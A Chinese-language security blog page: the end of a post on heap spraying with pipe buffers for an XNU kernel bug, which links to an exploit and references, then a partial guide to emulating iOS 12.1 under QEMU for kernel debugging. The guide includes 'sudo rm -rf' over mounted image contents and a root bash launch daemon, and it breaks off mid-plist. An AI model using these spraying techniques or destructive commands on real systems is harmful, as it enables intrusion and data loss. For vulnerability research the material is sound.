<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Pipe buffer size, keep moderate in value, pipes take kva space.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PIPE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_SIZE	16384</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_KVAMAX	(1024 * 1024 * 16)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> BIG_PIPE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BIG_PIPE_SIZE	(64*1024)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SMALL_PIPE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALL_PIPE_SIZE	PAGE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>如果数据已被写入管道缓冲区并且管道缓冲区已满，则认为该管道缓冲区已阻塞。要释放该管道缓冲区必须从中读取数据。可以通过分配许多管道缓冲区并将数据写入其中来利用管道缓冲区进行喷射。可以创建的管道总数是16MB除以16384字节，即1024。</p>
<p>管道缓冲区的优势在于，如果能够获得指向其中一个管道缓冲区的指针并读取其值，则基本上可以识别出是这1024个管道缓冲区中的哪个，然后就可以在这个特定的管道缓冲区中重新分配数据。</p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>也可以直接去看<a target="_blank" rel="noopener" href="https://bugs.chromium.org/p/project-zero/issues/attachment?aid=377026&signed_aid=RWxVCY6jN3pZa8F0_0iOhg==">Exp</a>，里面注释很详细。</p>
<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p><a target="_blank" rel="noopener" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1731">Project Zero Issue tracker</a></p>
<p>[iOS 10 - Kernel Heap Revisited](<a target="_blank" rel="noopener" href="https://gsec.hitb.org/materials/sg2016/D2">https://gsec.hitb.org/materials/sg2016/D2</a> - Stefan Esser - iOS 10 Kernel Heap Revisited.pdf)</p>
<p><a target="_blank" rel="noopener" href="https://www.amazon.com/Mac-OS-Internals-Approach-paperback/dp/0134426541">Mac OS X Internals: A Systems Approach</a></p>
<p><a target="_blank" rel="noopener" href="https://www.amazon.com/MacOS-iOS-Internals-III-Insecurity/dp/0991055535">MacOS and iOS Internals, Volume III: Security &amp; Insecurity</a></p>
<p><a target="_blank" rel="noopener" href="https://www.slideshare.net/i0n1c/cansecwest-2017-portal-to-the-ios-core">CanSecWest 2017 - Port(al) to the iOS Core</a></p>
<p><a target="_blank" rel="noopener" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1731">Project Zero Issue tracker</a></p>
<p>[iOS 10 - Kernel Heap Revisited](<a target="_blank" rel="noopener" href="https://gsec.hitb.org/materials/sg2016/D2">https://gsec.hitb.org/materials/sg2016/D2</a> - Stefan Esser - iOS 10 Kernel Heap Revisited.pdf)</p>
<p><a target="_blank" rel="noopener" href="https://www.amazon.com/Mac-OS-Internals-Approach-paperback/dp/0134426541">Mac OS X Internals: A Systems Approach</a></p>
<p><a target="_blank" rel="noopener" href="https://www.amazon.com/MacOS-iOS-Internals-III-Insecurity/dp/0991055535">MacOS and iOS Internals, Volume III: Security &amp; Insecurity</a></p>
<p><a target="_blank" rel="noopener" href="https://www.slideshare.net/i0n1c/cansecwest-2017-portal-to-the-ios-core">CanSecWest 2017 - Port(al) to the iOS Core</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-02-26T04:59:20.000Z" title="2022/2/26 12:59:20">2022-02-26</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-03-28T12:32:17.552Z" title="2022/3/28 20:32:17">2022-03-28</time></span><span class="level-item">16 minutes read (About 2338 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/02/26/qemu-xnu%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">qemu xnu内核调试环境搭建</a></p><div class="content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>开始看一些xnu内核的漏洞，发现有时候没有对应的硬件设备去调试，因此，整理一下qemu的方式。</p>
<p>下面一边看资料，一边整理。</p>
<h1 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h1><p>QEMU模拟是从kernelcache开始的，没有iBoot&#x2F;Secure ROM阶段。</p>
<p>下载的ipsw包里包含kernelcache和rfs，然后根据iOS启动流程，设置好相应的数据，如DT、boot-args等，将这些数据传给XNU即可。所以主要是需要逆向iBoot，iBoot有泄漏的源码。</p>
<h1 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h1><h2 id="第一步，获取ipsw文件"><a href="#第一步，获取ipsw文件" class="headerlink" title="第一步，获取ipsw文件"></a>第一步，获取ipsw文件</h2><p><a target="_blank" rel="noopener" href="http://updates-http.cdn-apple.com/2018FallFCS/fullrestores/091-91479/964118EC-D4BE-11E8-BC75-A45C715A3354/iPhone_5.5_12.1_16B92_Restore.ipsw">iOS 12.1 更新文件</a>，然后解压出来，各个文件的具体意思，可以在theiphonewiki上看到。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解压后的目录结构</span></span><br><span class="line">048-31952-103.dmg</span><br><span class="line">048-32459-105.dmg</span><br><span class="line">048-32651-104.dmg</span><br><span class="line">BuildManifest.plist</span><br><span class="line">Firmware/</span><br><span class="line">Restore.plist</span><br><span class="line">kernelcache.release.iphone7</span><br><span class="line">kernelcache.release.n66</span><br></pre></td></tr></table></figure>

<h2 id="第二步，工具准备"><a href="#第二步，工具准备" class="headerlink" title="第二步，工具准备"></a>第二步，工具准备</h2><h3 id="xnu-qemu-arm64-tools"><a href="#xnu-qemu-arm64-tools" class="headerlink" title="xnu-qemu-arm64-tools"></a><strong>xnu-qemu-arm64-tools</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/alephsecurity/xnu-qemu-arm64-tools</span><br></pre></td></tr></table></figure>

<h3 id="xnu-qemu-arm64"><a href="#xnu-qemu-arm64" class="headerlink" title="xnu-qemu-arm64"></a>xnu-qemu-arm64</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/alephsecurity/xnu-qemu-arm64</span><br></pre></td></tr></table></figure>

<h3 id="xnu源码"><a href="#xnu源码" class="headerlink" title="xnu源码"></a>xnu源码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/apple/darwin-xnu.git </span><br></pre></td></tr></table></figure>

<h3 id="AARCH64-的交叉编译器"><a href="#AARCH64-的交叉编译器" class="headerlink" title="AARCH64 的交叉编译器"></a>AARCH64 的交叉编译器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">brew tap SergioBenitez/osxct</span><br><span class="line">brew install aarch64-none-elf</span><br></pre></td></tr></table></figure>

<h3 id="rootlessJB"><a href="#rootlessJB" class="headerlink" title="rootlessJB"></a>rootlessJB</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/jakeajames/rootlessJB</span><br></pre></td></tr></table></figure>



<h2 id="第三步，提取-ASN1-编码的内核映像"><a href="#第三步，提取-ASN1-编码的内核映像" class="headerlink" title="第三步，提取 ASN1 编码的内核映像"></a>第三步，提取 ASN1 编码的内核映像</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 xnu-qemu-arm64-tools/bootstrap_scripts/asn1kerneldecode.py iPhone_5.5_12.1_16B92_Restore/kernelcache.release.n66 iPhone_5.5_12.1_16B92_Restore/kernelcache.release.n66.asn1decoded</span><br></pre></td></tr></table></figure>

<p>解码后的内核映像包含 lzss 压缩内核，进行解压：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 xnu-qemu-arm64-tools/bootstrap_scripts/decompress_lzss.py iPhone_5.5_12.1_16B92_Restore/kernelcache.release.n66.asn1decoded iPhone_5.5_12.1_16B92_Restore/kernelcache.release.n66.out</span><br></pre></td></tr></table></figure>

<h2 id="第四步，从-ASN1-编码文件中提取设备树"><a href="#第四步，从-ASN1-编码文件中提取设备树" class="headerlink" title="第四步，从 ASN1 编码文件中提取设备树"></a>第四步，从 ASN1 编码文件中提取设备树</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xnu-qemu-arm64-tools/bootstrap_scripts/asn1dtredecode.py iPhone_5.5_12.1_16B92_Restore/Firmware/all_flash/DeviceTree.n66ap.im4p iPhone_5.5_12.1_16B92_Restore/Firmware/all_flash/DeviceTree.n66ap.im4p.out</span><br></pre></td></tr></table></figure>

<h2 id="第五步，为-iOS-系统创建磁盘设备"><a href="#第五步，为-iOS-系统创建磁盘设备" class="headerlink" title="第五步，为 iOS 系统创建磁盘设备"></a>第五步，为 iOS 系统创建磁盘设备</h2><h3 id="1-创建主磁盘设备"><a href="#1-创建主磁盘设备" class="headerlink" title="1. 创建主磁盘设备"></a>1. 创建主磁盘设备</h3><h4 id="iOS-内核的自定义块设备驱动程序"><a href="#iOS-内核的自定义块设备驱动程序" class="headerlink" title="iOS 内核的自定义块设备驱动程序"></a>iOS 内核的自定义块设备驱动程序</h4><p>为了能够在驱动程序代码中使用iOS内核中的函数，需要将驱动程序与内核中的符号链接起来。</p>
<p>提取符号：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nm iPhone_5.5_12.1_16B92_Restore/kernelcache.release.n66.out &gt; iPhone_5.5_12.1_16B92_Restore/symbols.nm</span><br></pre></td></tr></table></figure>

<h4 id="创建环境变量"><a href="#创建环境变量" class="headerlink" title="创建环境变量"></a>创建环境变量</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> XNU_SOURCES=full_path_to_darwin-xnu</span><br><span class="line"><span class="built_in">export</span> KERNEL_SYMBOLS_FILE=full_path_to_symbols.nm</span><br><span class="line"><span class="built_in">export</span> QEMU_DIR=full_path_to_xnu-qemu-arm64</span><br><span class="line"><span class="built_in">export</span> NUM_BLOCK_DEVS=2</span><br></pre></td></tr></table></figure>

<h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><p>编译生成一个 flat 文件<code>bin/aleph_bdev_drv.bin</code>。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -C xnu-qemu-arm64-tools/aleph_bdev_drv</span><br></pre></td></tr></table></figure>

<p>直接编译会报错，需要先切换xnu的源码。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout xnu-4903.270.47</span><br></pre></td></tr></table></figure>

<p>生成后，将aleph_bdev_drv.bin复制到工作目录。</p>
<h3 id="2-解码-ramdisk"><a href="#2-解码-ramdisk" class="headerlink" title="2. 解码 ramdisk"></a>2. 解码 ramdisk</h3><p>将 ramdisk 设备和主磁盘映像挂载到计算机。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 xnu-qemu-arm64-tools/bootstrap_scripts/asn1rdskdecode.py iPhone_5.5_12.1_16B92_Restore/048-32651-104.dmg iPhone_5.5_12.1_16B92_Restore/048-32651-104.dmg.out</span><br><span class="line"><span class="built_in">cp</span> iPhone_5.5_12.1_16B92_Restore/048-32651-104.dmg.out ./hfs.main</span><br><span class="line">hdiutil resize -size 6G -imagekey diskimage-class=CRawDiskImage ./hfs.main</span><br><span class="line">hdiutil attach -imagekey diskimage-class=CRawDiskImage ./hfs.main</span><br><span class="line">hdiutil attach iPhone_5.5_12.1_16B92_Restore/048-31952-103.dmg</span><br></pre></td></tr></table></figure>

<p>删除 ramdisk 的所有内容并将 ramdisk 与主磁盘映像同步。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> diskutil enableownership /Volumes/PeaceB16B92.arm64UpdateRamDisk/</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> -rf /Volumes/PeaceB16B92.arm64UpdateRamDisk/*</span><br><span class="line"><span class="built_in">sudo</span> rsync -av /Volumes/PeaceB16B92.N56N66OS/* /Volumes/PeaceB16B92.arm64UpdateRamDisk/</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chown</span> root /Volumes/PeaceB16B92.arm64UpdateRamDisk/System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64</span><br></pre></td></tr></table></figure>

<p>删除<code>/private/var</code>。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> -rf /Volumes/PeaceB16B92.arm64UpdateRamDisk/private/var/*</span><br></pre></td></tr></table></figure>

<h3 id="3-获取预编译的二进制文件"><a href="#3-获取预编译的二进制文件" class="headerlink" title="3. 获取预编译的二进制文件"></a>3. 获取预编译的二进制文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> rootlessJB/rootlessJB/bootstrap/tars/</span><br><span class="line">tar xvf iosbinpack.tar</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">cp</span> -R iosbinpack64 /Volumes/PeaceB16B92.arm64UpdateRamDisk/</span><br><span class="line"><span class="built_in">cd</span> -</span><br></pre></td></tr></table></figure>

<h3 id="4-添加要在系统启动时执行的程序"><a href="#4-添加要在系统启动时执行的程序" class="headerlink" title="4. 添加要在系统启动时执行的程序"></a>4. 添加要在系统启动时执行的程序</h3><p>四个可执行文件将添加到 Launch Daemons目录中，以便在系统加载时启动。</p>
<p><strong>bash</strong></p>
<p>创建<code>plist</code>文件并将其另存为<code>/Volumes/PeaceB16B92.arm64UpdateRamDisk/System/Library/LaunchDaemons/bash.plist</code>。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">plist</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//Apple//DTD PLIST 1.0//EN&quot;</span> <span class="string">&quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plist</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dict</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>EnablePressuredExit<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">false</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>Label<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">string</span>&gt;</span>com.apple.bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>POSIXSpawnType<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">string</span>&gt;</span>Interactive<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>ProgramArguments<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>/iosbinpack64/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>RunAtLoad<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>StandardErrorPath<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">string</span>&gt;</span>/dev/console<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>StandardInPath<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">string</span>&gt;</span>/dev/console<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>StandardOutPath<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">string</span>&gt;</span>/dev/console<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>Umask<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">integer</span>&gt;</span>0<span class="tag">&lt;/<span class="name">integer</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>UserName<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">string</span>&gt;</span>root<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dict</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plist</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>mount_sec</strong> - 挂载辅助块设备（disk1）</p>
<p>创建<code>plist</code>文件并将其另存为<code>/Volumes/PeaceB16B92.arm64UpdateRamDisk/System/Library/LaunchDaemons/mount_sec.plist</code>。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">plist</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//Apple//DTD PLIST 1.0//EN&quot;</span> <span class="string">&quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plist</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dict</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>CFBundleIdentifier<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">string</span>&gt;</span>com.apple.mount_sec<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>EnablePressuredExit<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">false</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>EnableTransactions<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">false</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>HighPriorityIO<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>Label<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">string</span>&gt;</span>mount_sec<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>POSIXSpawnType<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">string</span>&gt;</span>Interactive<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>ProgramArguments<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>/sbin/mount<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>/private/var<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>RunAtLoad<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>Umask<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">integer</span>&gt;</span>0<span class="tag">&lt;/<span class="name">integer</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>UserName<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">string</span>&gt;</span>root<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dict</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plist</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong><a target="_blank" rel="noopener" href="https://github.com/alephsecurity/xnu-qemu-arm64-tools/tree/master/tcp-tunnel">tcptunnel</a></strong> - 在主机和guest之间的端口 2222 上打开 TCP 隧道。SSH 将在此隧道之上运行。</p>
<p>创建<code>plist</code>文件并将其另存为<code>/Volumes/PeaceB16B92.arm64UpdateRamDisk/System/Library/LaunchDaemons/tcptunnel.plist</code>。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">plist</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//Apple//DTD PLIST 1.0//EN&quot;</span> <span class="string">&quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plist</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dict</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>CFBundleIdentifier<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">string</span>&gt;</span>com.apple.tcptunnel<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>EnablePressuredExit<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">false</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>EnableTransactions<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">false</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>HighPriorityIO<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">false</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>KeepAlive<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>Label<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">string</span>&gt;</span>TcpTunnel<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>POSIXSpawnType<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">string</span>&gt;</span>Interactive<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>ProgramArguments<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/tunnel<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>2222:127.0.0.1:22<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>RunAtLoad<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>Umask<span class="tag">&lt;/<span 